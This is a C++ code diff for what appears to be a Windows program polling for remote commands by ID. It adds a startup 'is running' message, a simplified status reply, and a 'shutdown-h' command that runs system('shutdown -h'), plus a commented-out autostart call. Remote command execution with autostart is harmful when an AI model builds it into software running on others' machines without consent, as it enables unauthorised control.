@@ -14,7 +14,7 @@ using json = nlohmann::json;
 constexpr int REFRESH = 1; //in seconds
 
 int main() {
-
+	//autostart();
     uptime_start = time(nullptr);
 
 	fstream file;
@@ -23,6 +23,8 @@ int main() {
 	file.close();
 
 	if (ID.empty()) ID = "X";
+
+	Send(ID + " Is running");
 
 	while (true) {
 		Sleep(REFRESH * 1000);
@@ -60,8 +62,10 @@ int main() {
 		if (ID == id) { //I used json cause propably in developing dupnix i will use it
 			if (command == "status") { 
 				string s; stringstream ss;
-				ss << getStatus(); ss >> s;
-				Send(s);
+				Send(getStatus());
+			}
+			else if (command == "shutdown-h") {
+				system("shutdown -h");
 			}
 		}
 	}
